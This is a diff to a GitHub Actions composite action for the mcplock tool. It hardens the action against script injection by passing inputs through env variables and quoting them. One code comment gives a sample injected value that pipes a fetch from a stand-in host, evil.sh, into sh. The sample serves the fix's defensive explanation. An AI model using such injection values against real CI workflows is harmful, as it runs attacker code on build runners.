@@ -21,11 +21,17 @@ inputs:
     required: false
     default: ''
   env:
-    description: 'Space-separated KEY=VALUE environment variable pairs passed to stdio server'
+    description: >-
+      Space-separated KEY=VALUE pairs passed to a stdio server. Prefer passing
+      secrets via the workflow''s own env and referencing them here, rather than
+      inlining literals.
     required: false
     default: ''
   mcplock-version:
-    description: 'PyPI package specifier for mcplock or path to install'
+    description: >-
+      pip specifier for mcplock. Defaults to the PyPI name, which requires the
+      Phase 6 release; until then pass a git URL, e.g.
+      "git+https://github.com/yash161004/mcplock@master".
     required: false
     default: 'mcplock'
   python-version:
@@ -41,28 +47,49 @@ runs:
       with:
         python-version: ${{ inputs.python-version }}
 
+    # Every caller-controlled value is passed through `env:` and referenced as a
+    # shell variable. Interpolating `${{ inputs.* }}` directly into `run:` splices
+    # the raw text into the script before bash sees it, so a value such as
+    #   foo"; curl evil.sh | sh; #
+    # executes on the runner. This is the standard GitHub Actions script-injection
+    # class; quoting the expansion is not sufficient, because the substitution
+    # happens before quoting is evaluated.
     - name: Install mcplock
       shell: bash
+      env:
+        MCPLOCK_VERSION: ${{ inputs.mcplock-version }}
       run: |
         python -m pip install --upgrade pip
-        pip install ${{ inputs.mcplock-version }}
+        python -m pip install -- "$MCPLOCK_VERSION"
 
     - name: Run mcplock check
       shell: bash
+      env:
+        MCPLOCK_SERVER: ${{ inputs.server }}
+        MCPLOCK_TRANSPORT: ${{ inputs.transport }}
+        MCPLOCK_FAIL_ON: ${{ inputs.fail-on }}
+        MCPLOCK_JSON_REPORT: ${{ inputs.json-report }}
+        MCPLOCK_ENV: ${{ inputs.env }}
       run: |
+        set -euo pipefail
+
         CMD_ARGS=()
-        if [ "${{ inputs.transport }}" != "auto" ]; then
-          CMD_ARGS+=("--transport" "${{ inputs.transport }}")
+        if [ -n "$MCPLOCK_TRANSPORT" ] && [ "$MCPLOCK_TRANSPORT" != "auto" ]; then
+          CMD_ARGS+=("--transport" "$MCPLOCK_TRANSPORT")
         fi
-        if [ -n "${{ inputs.fail-on }}" ]; then
-          CMD_ARGS+=("--fail-on" "${{ inputs.fail-on }}")
+        if [ -n "$MCPLOCK_FAIL_ON" ]; then
+          CMD_ARGS+=("--fail-on" "$MCPLOCK_FAIL_ON")
         fi
-        if [ -n "${{ inputs.json-report }}" ]; then
-          CMD_ARGS+=("--json" "${{ inputs.json-report }}")
+        if [ -n "$MCPLOCK_JSON_REPORT" ]; then
+          CMD_ARGS+=("--json" "$MCPLOCK_JSON_REPORT")
         fi
-        if [ -n "${{ inputs.env }}" ]; then
-          for pair in ${{ inputs.env }}; do
+        if [ -n "$MCPLOCK_ENV" ]; then
+          # read -ra splits on whitespace without globbing or re-evaluating the
+          # value, which a bare `for pair in $MCPLOCK_ENV` would do.
+          read -ra ENV_PAIRS <<< "$MCPLOCK_ENV"
+          for pair in "${ENV_PAIRS[@]}"; do
             CMD_ARGS+=("--env" "$pair")
           done
         fi
-        mcplock check "${{ inputs.server }}" "${CMD_ARGS[@]}"
+
+        mcplock check "$MCPLOCK_SERVER" "${CMD_ARGS[@]}"
